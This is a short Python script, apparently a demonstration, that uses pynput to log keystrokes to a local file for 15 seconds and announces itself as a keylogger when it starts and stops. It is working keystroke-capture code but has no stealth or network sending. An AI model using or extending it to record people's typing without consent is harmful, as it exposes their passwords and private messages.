from pynput import keyboard
import time
import threading

# Function to log keystrokes
def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'{key.char}')
    except AttributeError:  # For special keys like shift, ctrl, etc.
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'[{key}]')

def stop_keylogger():
    print("Stopping keylogger...")
    listener.stop()

# Set a timer for 15 seconds
listener = keyboard.Listener(on_press=on_press)
timer = threading.Timer(15, stop_keylogger)

print("Starting keylogger for 15 seconds...")
timer.start()
listener.start()
listener.join()

print("Keylogger has stopped. Check 'keylog.txt' for the recorded keys.")
